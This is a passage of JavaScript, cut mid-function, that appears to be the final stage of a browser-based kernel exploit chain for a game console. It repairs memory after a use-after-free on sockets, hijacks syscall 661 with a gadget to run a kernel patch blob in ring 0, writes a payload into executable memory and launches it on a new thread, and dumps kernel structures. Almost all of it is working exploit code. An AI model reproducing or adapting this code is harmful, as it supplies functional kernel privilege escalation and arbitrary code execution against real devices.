                        // panicking minutes later. A run is clean only if the fd
                        // table was repaired AND the zone drain removed every
                        // duplicate AND fresh allocations no longer see it.
                        check("alias-freed-file-nulled",
                            nulled > 0, "nulled=" + nulled);
                        const clean = nulled > 0 && zoneClean;
                        if (clean) rebootRequired = false;
                        else mark("STILL-DIRTY", "reboot=1 fdtable="
                            + (nulled > 0 ? "ok" : "FAILED")
                            + " zone=" + (zoneClean ? "ok" : "FAILED"));
                    } else {
                        check("uaf_sock-struct-file-readable", false,
                            "fp=" + uafFp);
                    }

                    {
                        let closed = 0, heldBack = 0;
                        for (const fd of ipv6) {
                            // ITEM 6(c). A still-burned socket owns an rthdr over
                            // freed memory; close() would free it a second time.
                            // Leaking the fd costs nothing, freeing it panics.
                            if (burned.has(fd)) { heldBack++; continue; }
                            if (sc(SYS.close, fd).i32 === 0) closed++;
                        }
                        for (const fd of [iovSs[0], iovSs[1], uioSs[0], uioSs[1]])
                            if (sc(SYS.close, fd).i32 === 0) closed++;
                        mark("SOCKETS-CLOSED", "n=" + closed + "/" + (ipv6.length + 4)
                            + (heldBack ? "  held_back_burned=" + heldBack : ""));
                    }

                    await restoreThreadAttrs("cleanup");


                    let kpatched = false;
                    if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
                        state("kernel patches...", "warn");
                        const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                        const sysent = kernelBase.add32(off.k_sysent_661);
                        const gadget = kernelBase.add32(off.k_jmp_rsi);
                        const gb = [];
                        for (let i = 0; i < 4; ++i) {
                            new Uint8Array(kvwAb).fill(0);
                            kv.kread(kvwAddr, gadget.add32(i), 1);
                            gb.push(kvwDv.getUint8(0));
                        }
                        mark("JMP-RSI-BYTES", gadget + " -> "
                            + gb.map(v => v.toString(16).padStart(2, "0")).join(" "));

                        const gadgetOk = gb[0] === 0xff && gb[1] === 0x26;
                        const oNarg = kview(sysent).getInt32(SYSENT_NARG);
                        const oCall = kview(sysent).getBInt(SYSENT_CALL);
                        const oThr = kview(sysent).getInt32(SYSENT_THRCNT);
                        mark("SYSENT-661", "narg=" + oNarg + " thrcnt=" + oThr
                            + " sy_call=" + oCall);
                        const sysentOk = oNarg >= 0 && oNarg <= 8 && kptr2(oCall);

                        const siteBytes = [];
                        let sitesOk = true;
                        for (const s of KPATCH_JMP_SITES) {
                            new Uint8Array(kvwAb).fill(0);
                            kv.kread(kvwAddr, kernelBase.add32(s), 1);
                            const b = kvwDv.getUint8(0);
                            siteBytes.push(hx(s) + ":" + b.toString(16));
                            if (!((b >= 0x70 && b <= 0x7f) || b === 0xeb)) sitesOk = false;
                        }
                        mark("KPATCH-SITES", siteBytes.join(" "));
                        check("gadget-sysent661-patch-sites-look-right",
                            gadgetOk && sysentOk && sitesOk,
                            "gadget=" + gadgetOk + " sysent=" + sysentOk
                            + " sites=" + sitesOk);
                        if (gadgetOk && sysentOk && sitesOk) {
                            const jitFd = sc(SYS.jitshm_create, 0, 0x4000, 7).i32;
                            const KEXEC_MAP = new int64(0x20100000, 9);
                            const mapped = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7,
                                0x11, jitFd, 0);
                            const mapAddr = new int64(mapped.lo, mapped.hi);
                            mark("KPATCH-MAP", "jitshm_create=" + jitFd
                                + " mmap=" + mapAddr);
                            if (mapAddr.hi > 0) {
                                for (let i = 0; i < kpatch.length; ++i)
                                    p.write1(mapAddr.add32(i), kpatch[i]);
                                let copied = true;
                                for (let i = 0; i < kpatch.length; ++i)
                                    if (p.read1(mapAddr.add32(i)) !== kpatch[i]) { copied = false; break; }
                                check("blob-rwx-memory-byte-byte",
                                    copied, kpatch.length + " bytes");
                                if (copied) {
                                    kview(sysent).setInt32(SYSENT_NARG, 2);
                                    kview(sysent).setBInt(SYSENT_CALL, gadget);
                                    kview(sysent).setInt32(SYSENT_THRCNT, 1);
                                    const armedOk = same(kview(sysent).getBInt(SYSENT_CALL), gadget);
                                    mark("SYSENT-ARMED", "sy_call=" + gadget
                                        + (armedOk ? "" : " MISMATCH"));
                                    if (armedOk) {
                                        // ITEM 5b. sysent[661] is now pointing at
                                        // a jmp [rsi] gadget SYSTEM-WIDE. If
                                        // anything between here and the restore
                                        // throws, every process on the console is
                                        // left with a weaponised syscall 661 --
                                        // and the outer finally does not cover
                                        // this, because it is nested inside the
                                        // KernelView block. Restore in a finally.
                                        let rc = -1;
                                        try {
                                            rc = sc(SYS.kexec, mapAddr).i32;
                                        } finally {
                                            kview(sysent).setInt32(SYSENT_NARG, oNarg);
                                            kview(sysent).setBInt(SYSENT_CALL, oCall);
                                            kview(sysent).setInt32(SYSENT_THRCNT, oThr);
                                            const back = same(
                                                kview(sysent).getBInt(SYSENT_CALL), oCall);
                                            if (!back) mark("SYSENT-NOT-RESTORED",
                                                "sy_call still " +
                                                kview(sysent).getBInt(SYSENT_CALL)
                                                + " -- syscall 661 is armed system-wide");
                                        }
                                        const verify = [];
                                        let allEb = true;
                                        for (const s of KPATCH_JMP_SITES) {
                                            new Uint8Array(kvwAb).fill(0);
                                            kv.kread(kvwAddr, kernelBase.add32(s), 1);
                                            const b = kvwDv.getUint8(0);
                                            verify.push(hx(s) + ":" + b.toString(16));
                                            if (b !== 0xeb) allEb = false;
                                        }
                                        mark("KEXEC", "arg=" + mapAddr + " rc=" + rc
                                            + " sysent=restored");
                                        mark("KPATCH-VERIFY", verify.join(" "));
                                        kpatched = rc === 0 && allEb;
                                        check("gated-site-reads-0xeb",
                                            allEb, "");
                                        check("blob-ran-ring-0", rc === 0,
                                            "kexec=" + rc);
                                        if (kpatched) mark("KERNEL-PATCHED",
                                            "sites=" + KPATCH_JMP_SITES.length);
                                    }
                                }
                            }
                        }
                    } else if (jailbroken) {
                        mark("KPATCH-SKIPPED", "blob=" + (kpatch ? kpatch.length : 0)
                            + " sites=" + KPATCH_JMP_SITES.length);
                    }

                    if (payload && (kpatched || params.get("payload") === "1")
                        && params.get("payload") !== "0") {
                        state("payload...", "warn");
                        const sz = (payload.length + 0x3fff) & ~0x3fff;
                        const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                        const entry = new int64(m.lo, m.hi);
                        mark("PAYLOAD-MAP", "size=0x" + sz.toString(16)
                            + " rwx=" + entry);
                        if (entry.hi > 0) {
                            for (let i = 0; i < payload.length; ++i)
                                p.write1(entry.add32(i), payload[i]);
                            let bad = -1;
                            for (let i = 0; i < payload.length; ++i)
                                if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
                            check("byte-payload-rwx-memory",
                                bad < 0, bad < 0 ? "" : "mismatch at +" + hx(bad));
                            if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
                                const slot = webkitBase.add32(off.wk___imp_pthread_create);
                                const fn = p.read8(slot);
                                const expect = libkernelBase.add32(off.k_pthread_create);
                                const agree = same(fn, expect);
                                mark("PTHREAD-TABLE", "got=" + fn + " table="
                                    + expect + " agree=" + (agree ? 1 : 0));
                                if (agree) {
                                    const thr = new ArrayBuffer(8);
                                    keepAlive.push(thr);
                                    const thrAddr = bufAddr(thr);
                                    new Uint8Array(thr).fill(0);
                                    const rc = callAddr(expect,
                                        [thrAddr, 0, entry, 0]).i32;
                                    const handle = new int64(
                                        new DataView(thr).getUint32(0, true),
                                        new DataView(thr).getUint32(4, true));
                                    payloadRunning = rc === 0 && handle.hi > 0;
                                    mark("PTHREAD-CREATE", "rc=" + rc
                                        + " handle=" + handle);
                                    check("payload-thread-created",
                                        payloadRunning, "");
                                    if (payloadRunning) {
                                        mark("PAYLOAD-RUNNING",
                                            "bytes=" + payload.length + " entry=" + entry);
                                        hostOk();
                                    }
                                }
                            }
                        }
                    }

                    // ================== END-OF-RUN STATE DUMP ==================
                    // READ ONLY. Not a fix -- a measurement. Everything above has
                    // finished, so this reports what we ACTUALLY leave behind
                    // rather than what the source implies we leave behind. Three
                    // confident inferences from reading code have already been
                    // wrong; this replaces the fourth with data.
                    // ?dump=0 to skip.
                    if (params.get("dump") !== "0") {
                        try {
                            const kq = v => v && (v.hi >>> 0) >= 0xffff0000;
                            const rd8 = a => kq(a) ? kv.read8(a) : null;
                            const rd32 = function (a) {
                                if (!kq(a)) return null;
                                dmpU8.fill(0);
                                if (kv.kread(dmpAddr, a, 4) !== 4) return null;
                                return dmpDv.getInt32(0, true);
                            };

                            // --- the 4 karw pipe files, and the forged pipebuf ---
                            // fd 15 reads f_count 2 BEFORE we touch it on every
                            // run while its siblings read 1. Nobody has explained
                            // that. This prints the final state of all four.
                            const pf = [];
                            for (const fd of [masterPipe[0], masterPipe[1],
                                              slavePipe[0], slavePipe[1]]) {
                                const fp = fget(fd);
                                pf.push(fd + ":" + (kq(fp) ? "fc=" + rd32(fp.add32(0x28))
                                                           : "nofp"));
                            }
                            mark("DUMP-PIPE-FCOUNT", pf.join(" "));

                            for (const [nm, fd] of [["master", masterPipe[0]],
                                                    ["slave", slavePipe[0]]]) {
                                const fp = fget(fd);
                                const fdata = rd8(fp);
                                if (!kq(fdata)) { mark("DUMP-PIPEBUF", nm + " nofdata"); continue; }
                                dmpU8.fill(0);
                                const okr = kv.kread(dmpAddr, fdata, 0x18) === 0x18;
                                mark("DUMP-PIPEBUF", nm + " @" + fdata
                                    + (okr ? "  cnt=" + dmpDv.getUint32(0, true)
                                        + " in=" + dmpDv.getUint32(4, true)
                                        + " out=" + dmpDv.getUint32(8, true)
                                        + " size=0x" + dmpDv.getUint32(0xc, true).toString(16)
                                        + " buffer=" + new int64(dmpDv.getUint32(0x10, true),
                                                                 dmpDv.getUint32(0x14, true))
                                        : "  READ-FAILED"));
                            }

                            // --- the triplets' outputopts, re-read after close ---
                            // Confirms the repair actually persisted rather than
                            // being undone by the socket teardown.
                            const to = [];
                            for (const e of dumpOpts) {
                                const r = rd8(e.opts.add32(0x68));
                                const pi = rd8(e.opts.add32(0x10));
                                to.push("fd" + e.fd + "@" + e.opts
                                    + " rthdr=" + (r || "?")
                                    + " pktinfo=" + (pi || "?"));
                            }
                            mark("DUMP-TRIPLET-OPTS", to.length ? to.join("  ") : "none");

                            // --- the triple-freed struct file ---
                            const uf = (typeof uafFpSaved !== "undefined") ? uafFpSaved : null;
                            if (kq(uf)) {
                                mark("DUMP-UAF-FILE", "fp=" + uf
                                    + " f_count=" + rd32(uf.add32(0x28))
                                    + " f_data=" + (rd8(uf) || "?"));
                            }

                            // --- ANY fd-table slot still pointing at it ---
                            if (kq(uf) && kq(fdtOfiles)) {
                                let hits = 0, lastFd = -1;
                                const wl = uf.low >>> 0, wh = uf.hi >>> 0;
                                const nfd = Math.min(0x400, (typeof SCAN_MAX !== "undefined")
                                    ? SCAN_MAX + 0x40 : 0x400);
                                for (let base = 0; base < nfd; base += 0x80) {
                                    const n = Math.min(0x80, nfd - base);
                                    if (kv.kread(scanAddrDump,
                                        fdtOfiles.add32(base * FILEDESCENT_SIZE),
                                        n * FILEDESCENT_SIZE) !== n * FILEDESCENT_SIZE) break;
                                    for (let i = 0; i < n; ++i) {
                                        const o = i * FILEDESCENT_SIZE;
                                        if (scanDvDump.getUint32(o, true) === wl
                                            && scanDvDump.getUint32(o + 4, true) === wh) {
                                            hits++; lastFd = base + i;
                                        }
                                    }
                                }
                                mark("DUMP-UAF-REFS", "slots_still_pointing_at_it=" + hits
                                    + (hits ? " last_fd=" + lastFd : "")
                                    + "  scanned=" + nfd);
                            }

                            // --- our own process ---
                            if (kq(curproc)) {
                                const uc = rd8(curproc.add32(0x40));
                                const pfd = rd8(curproc.add32(0x48));
                                mark("DUMP-PROC", "curproc=" + curproc
                                    + " ucred=" + (uc || "?")
                                    + (kq(uc) ? " cr_ref=" + rd32(uc.add32(0x00))
                                        + " uid=" + rd32(uc.add32(0x04))
                                        + " prison=" + (rd8(uc.add32(0x30)) || "?") : "")
                                    + " p_fd=" + (pfd || "?"));
                                if (kq(pfd))
                                    mark("DUMP-FILEDESC", "fd_cdir=" + (rd8(pfd.add32(0x10)) || "?")
                                        + " fd_rdir=" + (rd8(pfd.add32(0x18)) || "?")
                                        + " fd_jdir=" + (rd8(pfd.add32(0x20)) || "?"));
                            }

                            mark("DUMP-DONE", "read-only, no kernel writes");
                        } catch (e) {
                            mark("DUMP-THREW", (e && e.message) ? e.message : String(e));
                        }
                    }
                    // ================ END END-OF-RUN STATE DUMP ================

                    mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken
                        + " kpatched=" + kpatched + " payload=" + payloadRunning
                        + " cleanup=" + (rebootRequired ? "incomplete" : "complete"));
                    allDone = payloadRunning && !rebootRequired;
                }
            }
        }

        mark("STEP10-SUMMARY", "committed=" + committed
            + " reboot=" + rebootRequired
            + " triplets=" + (triplets ? triplets.join(",") : "none")
            + " kernel_base=" + (kernelBase || "none")
            + " kq_fdp=" + (kqFdp || "none")
            + " kv=" + (kv ? "up" : "down"));

        if (!kv) {
            const stage = !committed ? "not-armed"
                : !triplets ? "triple-free"
                : !kernelBase ? "leak-kqueue"
                : "make-karw";
            mark("FAILED-STAGE", "stage=" + stage
                + " reached=" + (triplets ? "triplets" : committed ? "commit" : "none"));
        }

        state(allDone ? "ALL DONE"
              : kv ? "KERNEL R/W -- REBOOT NEEDED"
              : kernelBase ? "FAILED IN make_karw -- REBOOT"
              : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
              : committed ? "FAILED IN triple free -- REBOOT"
              : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
			  
		if (!payloadRunning) {
            hostFail();
        }
    } catch (e) {
        mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
        state("FAILED -- see log", "bad");
        hostFail();
    } finally {

        if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);

        try {
            if (restoreCtx) await restoreCtx.restore("finally");
        } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
        for (const w of workers) {
            try { if (w.armed) { await w.rpc("disarm", 5000); w.armed = false; } }
            catch (e) { mark("DISARM-THREW", w.name + " " + e.message); }
        }
        for (const w of workers) {
            try {
                if (w.wired && w.master && w.origVector && p) {
                    p.write8(w.master.add32(0x10), w.origVector);
                    w.wired = false;
                }
            } catch (e) { }
        }
        for (const w of workers) { try { w.worker.terminate(); } catch (e) { } }
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) { mark("DISARM-THREW", e.message); }

        if (rebootRequired)
            mark("REBOOT-REQUIRED", "reason=uaf-file-not-reclaimed");
    }
})();
